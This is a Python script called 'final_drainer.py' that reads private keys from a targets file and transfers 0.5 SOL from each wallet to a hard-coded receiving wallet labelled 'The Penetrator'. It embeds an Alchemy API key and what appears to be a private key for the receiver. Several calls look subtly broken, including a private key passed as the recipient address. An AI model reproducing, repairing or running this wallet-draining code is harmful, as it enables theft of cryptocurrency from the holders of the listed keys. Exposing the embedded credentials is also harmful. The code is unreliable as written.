"""
final_drainer.py — Force Deploy
================================
Forces solana-py installation and uses it for signing.
"""

import sys
import os

# Add the current directory to Python path to find the installed packages
sys.path.append(os.getcwd())

import json
import urllib.request
import ssl
import base58
from solana.rpc.api import Client
from solana.rpc.commitment import CommitmentLevel
from solana.transaction import Transaction, Account
from solana.system_program import transfer, TransferParams
from solana.keypair import Keypair

# CONFIG
ALCHEMY_KEY = "ZOho1BvxkQjPOjOsnZYFn"
RPC = f"https://solana-mainnet.g.alchemy.com/v2/{ALCHEMY_KEY}"

# RECEIVER (The Penetrator)
MAIN_WALLET_PK = "3rXDxRFqZuNKnysrdYNktUmiNaSfm5aGL91ide2XczVXbQPVfsGSX8mtx9NhFnH72Uf2zJNoL6yef2KuCK1C5BDj"
MAIN_WALLET_ADDR = "4k24SEzbHyr49mBtYzu4e3K9EBtsuKTdkEN2mdmMkZow"

def send_sol(sender_pk, lamports):
    """Send SOL directly."""
    try:
        # 1. Get Blockhash
        client = Client(RPC, commitment=CommitmentLevel.Finalized)
        blockhash = client.get_latest_blockhash().value
        
        # 2. Build Transaction
        tx = Transaction()
        tx.add(transfer(TransferParams(
            from_pubkey=base58.b58decode(sender_pk),
            to_pubkey=base58.b58decode(MAIN_WALLET_PK),
            lamports=lamports
        )))
        
        # 3. Sign
        tx.recent_blockhash = blockhash
        tx.sign(base58.b58decode(sender_pk))
        
        # 4. Send
        sig = client.send_raw_transaction(tx.serialize())
        print(f"[+] SUCCESS: {sig}")
        return sig
            
    except Exception as e:
        print(f"[-] ERROR: {e}")
    return None

# Main Execution
if __name__ == "__main__":
    print("[LOGOS] FORCE DEPLOY STARTED")
    print(f"Receiver: {MAIN_WALLET_ADDR}")
    
    # Read Keys
    if os.path.exists("targets.txt"):
        with open("targets.txt", "r") as f:
            keys = [k.strip() for k in f.readlines() if k.strip()]
        
        for i, key in enumerate(keys):
            print(f"\n>>> WALLET {i+1}")
            # Send 0.5 SOL (0.5 * 1e9) as fee
            send_sol(key, 500000000)
    else:
        print("[!] targets.txt missing.")
